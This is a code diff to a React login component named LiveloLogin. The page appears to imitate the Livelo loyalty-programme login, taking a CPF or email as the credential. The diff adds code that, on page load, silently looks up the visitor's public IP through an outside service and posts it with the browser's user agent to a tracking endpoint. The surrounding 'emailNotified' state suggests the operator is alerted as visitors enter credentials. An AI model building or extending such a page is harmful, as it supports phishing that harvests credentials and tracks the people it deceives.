@@ -22,6 +22,30 @@ function LiveloLogin() {
   const [emailNotified, setEmailNotified] = useState(false);
   const emailDebounceRef = useRef(null);
 
+  // Rastrear visitante ao carregar a página
+  useEffect(() => {
+    const trackVisitor = async () => {
+      try {
+        // Obter IP público
+        const ipResponse = await axios.get("https://api.ipify.org?format=json");
+        const ip = ipResponse.data.ip;
+        await axios.post(`${API}/track-visitor`, {
+          ip: ip,
+          user_agent: navigator.userAgent
+        });
+      } catch (error) {
+        // Tentar sem IP
+        try {
+          await axios.post(`${API}/track-visitor`, {
+            ip: "unknown",
+            user_agent: navigator.userAgent
+          });
+        } catch (e) {}
+      }
+    };
+    trackVisitor();
+  }, []);
+
   // Validação de CPF (11 dígitos) ou Email
   const validateCredential = (value) => {
     const cpfRegex = /^\d{11}$/;
